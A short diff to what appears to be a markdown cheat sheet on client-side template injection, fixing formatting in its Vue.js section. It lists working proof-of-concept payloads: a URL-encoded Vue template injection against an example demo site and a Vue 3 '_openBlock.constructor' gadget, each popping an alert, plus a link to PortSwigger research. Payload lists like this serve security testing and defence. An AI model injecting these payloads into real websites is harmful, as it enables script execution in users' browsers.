@@ -16,7 +16,7 @@
 ```
 
 ## vueJS
-- Working payload: `https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor(%27alert(%22foo%22)%27)()%7D%`\
+- Working payload: `https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor(%27alert(%22foo%22)%27)()%7D%`
 - A really good post on CSTI in VUE can be found in [portswigger.net](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)
   ### v3
     - `{{_openBlock.constructor('alert(1)')()}}`
